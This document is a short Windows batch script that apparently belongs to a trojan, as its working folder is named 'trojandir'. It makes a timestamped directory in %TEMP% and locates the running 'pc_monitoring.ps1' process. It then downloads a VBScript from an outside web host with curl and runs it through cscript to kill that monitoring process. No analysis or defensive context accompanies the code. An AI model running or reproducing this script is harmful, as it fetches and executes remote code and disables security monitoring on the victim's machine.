

wmic OS GET LocalDateTime | findstr /v "^$" | findstr /v "LocalDateTime" > %temp%\wmic_check_timestamp.txt

SET /p tt=<%temp%\wmic_check_timestamp.txt

SET "timestamp=%tt:~0,14%%tt:~15,4%"

set workdir=%temp%

IF EXIST %TEMP%\owd (
    cd /d %TEMP%\owd
    
    set workdir=%temp%\owd
)

SET "trojandir=%TEMP%\owd"

md %TEMP%\owd\kill_pcmon_%timestamp%

IF EXIST %TEMP%\owd\kill_pcmon_%timestamp% (
    cd /d %TEMP%\owd\kill_pcmon_%timestamp%
    
    set workdir=%temp%\owd\kill_pcmon_%timestamp%
)

SET "logfpath=%workdir%\kill_pcmon_%timestamp%.log"

type nul > %logfpath%

echo starting kill_pcmon script >> %logfpath%

wmic process get processid, commandline /format:csv | findstr /v findstr | findstr pc_monitoring.ps1 > %workdir%\pcmon_pid

curl -o %workdir%\extract_kill_pid.vbs http://s1083932807.online-home.ca/ow/retrieve.php?filename=extract_kill_pid.vbs 

cscript.exe %workdir%\extract_kill_pid.vbs %workdir%\pcmon_pid > %workdir%\kill_pcmon_%timestamp%.log


